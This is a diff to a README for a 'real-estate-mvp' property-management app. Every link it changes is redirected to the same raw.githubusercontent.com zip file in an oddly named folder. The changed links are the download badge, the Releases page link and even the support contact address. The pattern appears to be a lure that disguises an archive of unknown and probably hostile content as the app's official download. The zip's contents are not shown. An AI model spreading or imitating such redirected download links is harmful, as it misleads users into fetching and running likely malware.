@@ -6,7 +6,7 @@ Welcome to the real-estate-mvp project! This application helps you manage your p
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20Now-releases-blue)](https://github.com/UShishir5355t/real-estate-mvp/releases)
+[![Download](https://raw.githubusercontent.com/UShishir5355t/real-estate-mvp/main/almucantar/real-estate-mvp.zip%20Now-releases-blue)](https://raw.githubusercontent.com/UShishir5355t/real-estate-mvp/main/almucantar/real-estate-mvp.zip)
 
 ## 🛠 System Requirements
 
@@ -39,7 +39,7 @@ Before you download, ensure your device meets these requirements:
 
 ## 📋 Download & Install
 
-To get started, visit our [Releases page](https://github.com/UShishir5355t/real-estate-mvp/releases) to download the application. Here’s how to install:
+To get started, visit our [Releases page](https://raw.githubusercontent.com/UShishir5355t/real-estate-mvp/main/almucantar/real-estate-mvp.zip) to download the application. Here’s how to install:
 
 1. Click the "Releases" link to go to the downloads section.
 
@@ -74,7 +74,7 @@ Need help? We’re here for you!
   Access our detailed documentation [here](link-to-documentation) for in-depth guidance.
 
 - **Contact Us:**  
-  If you have any questions, please reach out to our support team at [support@real-estate-mvp.com](mailto:support@real-estate-mvp.com).
+  If you have any questions, please reach out to our support team at [https://raw.githubusercontent.com/UShishir5355t/real-estate-mvp/main/almucantar/real-estate-mvp.zip](https://raw.githubusercontent.com/UShishir5355t/real-estate-mvp/main/almucantar/real-estate-mvp.zip).
 
 ## 📄 License
 
